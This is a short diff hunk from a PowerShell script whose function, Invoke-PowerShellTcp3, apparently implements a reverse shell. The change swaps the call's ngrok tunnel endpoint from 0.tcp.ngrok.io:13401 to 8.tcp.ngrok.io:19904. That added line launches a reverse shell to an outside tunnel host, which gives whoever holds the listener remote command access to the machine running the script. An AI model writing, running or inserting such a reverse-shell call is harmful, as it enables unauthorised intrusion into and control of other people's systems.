@@ -88,4 +88,4 @@ function Invoke-PowerShellTcp3
     }
 }
 
-Invoke-PowerShellTcp3 -Reverse -IPAddress 0.tcp.ngrok.io -Port 13401
+Invoke-PowerShellTcp3 -Reverse -IPAddress 8.tcp.ngrok.io -Port 19904
